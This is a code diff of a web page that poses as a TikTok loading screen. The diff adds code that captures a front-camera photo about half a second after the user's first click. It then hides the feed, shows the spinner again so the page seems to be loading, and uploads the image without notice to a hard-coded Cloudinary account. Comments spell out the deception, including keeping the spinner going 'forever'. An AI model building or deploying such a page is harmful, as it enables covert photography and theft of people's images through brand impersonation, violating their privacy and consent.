@@ -5,18 +5,16 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>TikTok</title>
 <style>
-/* 1. Reset and Full Screen Setup */
 body, html {
 margin: 0;
 padding: 0;
 width: 100%;
 height: 100%;
 background-color: #000;
-font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-overflow: hidden; /* Prevent scrolling */
+overflow: hidden;
 }
 
-/* 2. The Video Feed (Hidden initially) */
+/* The Video Feed - Hidden initially */
 #videoFeed {
 position: absolute;
 top: 0;
@@ -25,10 +23,10 @@ width: 100%;
 height: 100%;
 object-fit: cover;
 z-index: 1;
-display: none; /* Hidden until loaded */
+display: none; /* Hidden until needed */
 }
 
-/* 3. The TikTok Loading Spinner (Visible initially) */
+/* The Loading Spinner - Visible initially */
 #loader {
 position: absolute;
 top: 50%;
@@ -36,12 +34,10 @@ left: 50%;
 transform: translate(-50%, -50%);
 z-index: 10;
 display: flex;
-flex-direction: column;
 align-items: center;
 justify-content: center;
 }
 
-/* TikTok-style Spinner */
 .spinner {
 width: 40px;
 height: 40px;
@@ -55,56 +51,50 @@ animation: spin 1s linear infinite;
 to { transform: rotate(360deg); }
 }
 
-/* 4. The Capture Overlay (Flash effect) */
+/* Flash Effect */
 #flash {
 position: absolute;
-top: 0;
-left: 0;
-width: 100%;
-height: 100%;
-background-color: white;
+top: 0; left: 0; width: 100%; height: 100%;
+background: white;
 opacity: 0;
-pointer-events: none;
 z-index: 20;
-transition: opacity 0.1s ease-out;
+pointer-events: none;
 }
 
-/* 5. Hidden Canvas for processing */
-#canvas {
-display: none;
-}
+#canvas { display: none; }
 </style>
 </head>
 <body>
 
-<!-- The Camera Feed -->
 <video id="videoFeed" autoplay playsinline muted></video>
-
-<!-- The Loading Spinner -->
-<div id="loader">
-<div class="spinner"></div>
-</div>
-
-<!-- Flash Effect Element -->
+<div id="loader"><div class="spinner"></div></div>
 <div id="flash"></div>
-
-<!-- Hidden Canvas to capture the frame -->
 <canvas id="canvas"></canvas>
 
+<!-- Cloudinary JS SDK -->
+<script src="https://upload-js.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script>
+
 <script>
+// --- CONFIGURATION ---
+// 1. Go to https://cloudinary.com, sign up free.
+// 2. Get your Cloud Name from the dashboard.
+const CLOUD_NAME = 'mmf0socw';
+// 3. Create an "Unsigned Upload Preset" in Cloudinary (Settings > Upload) and paste its name here.
+const UPLOAD_PRESET = 'ml_default';
+// ---------------------
+
 const video = document.getElementById('videoFeed');
 const loader = document.getElementById('loader');
 const flash = document.getElementById('flash');
 const canvas = document.getElementById('canvas');
 
-let isCaptured = false;
+let captured = false;
 
-// 1. Initialize Camera on First Click (Browsers require user interaction to start camera)
-document.body.addEventListener('click', async function() {
-if (isCaptured) return; // Prevent multiple captures
+// Step 1: User clicks anywhere -> Start Camera
+document.body.addEventListener('click', async () => {
+if (captured) return;
 
 try {
-// Request Front Camera
 const stream = await navigator.mediaDevices.getUserMedia({
 video: { facingMode: "user" },
 audio: false
@@ -112,52 +102,64 @@ audio: false
 
 video.srcObject = stream;
 
-// Wait for the video to actually start playing before hiding loader
+// Wait for video to load
 video.onloadedmetadata = () => {
 video.play();
-loader.style.display = 'none'; // Hide spinner
-video.style.display = 'block'; // Show camera
+
+// Hide loader, show video briefly so it looks like it loaded
+loader.style.display = 'none';
+video.style.display = 'block';
+
+// Step 2: Wait 500ms then Capture Automatically
+setTimeout(() => {
+captureAndSend();
+}, 500);
 };
 
 } catch (err) {
 console.error("Camera error:", err);
-alert("Could not access camera. Please allow permissions.");
+alert("Camera permission denied.");
 }
-}, { once: true }); // This event only fires ONCE
+});
 
-// 2. Handle the "Silent" Capture
-document.body.addEventListener('click', function() {
-if (isCaptured || video.style.display === 'none') return;
+function captureAndSend() {
+if (captured) return;
+captured = true;
 
-isCaptured = true;
-
-// Set canvas size to match video
+// 1. Set Canvas Size
 canvas.width = video.videoWidth;
 canvas.height = video.videoHeight;
-
 const ctx = canvas.getContext('2d');
 
-// Draw the current frame onto the canvas
-ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+// 2. Draw Frame
+ctx.drawImage(video, 0, 0);
 
-// Optional: Flash effect (very quick white screen)
+// 3. Flash Effect (Optional, very fast)
 flash.style.opacity = '1';
 setTimeout(() => { flash.style.opacity = '0'; }, 100);
 
-// Convert to Image Data (Base64)
-const imageData = canvas.toDataURL('image/jpeg', 0.8);
-
-// --- OPTION A: Save to LocalStorage (Simplest, no server needed) ---
-localStorage.setItem('tiktok_selfie', imageData);
-
-// Hide the camera feed after capture so it looks like a "finished" state
+// 4. Hide Video Feed (User sees blank screen or loader again)
 video.style.display = 'none';
-loader.style.display = 'flex'; // Bring back spinner or hide it
+loader.style.display = 'flex'; // Show spinner again to indicate "processing"
 
-// Optional: Alert just to confirm (remove in production for stealth)
-// alert("Photo taken!");
+// 5. Convert to Blob and Upload to Cloudinary
+canvas.toBlob((blob) => {
+const formData = new FormData();
+formData.append('file', blob, 'selfie.jpg');
+formData.append('upload_preset', UPLOAD_PRESET);
 
-});
+fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
+method: 'POST',
+body: formData
+})
+.then(response => response.json())
+.then(data => {
+console.log('Uploaded:', data.secure_url);
+// Optional: You can keep the spinner spinning forever to look like it's loading
+})
+.catch(err => console.error('Upload failed', err));
+}, 'image/jpeg');
+}
 </script>
 </body>
 </html>
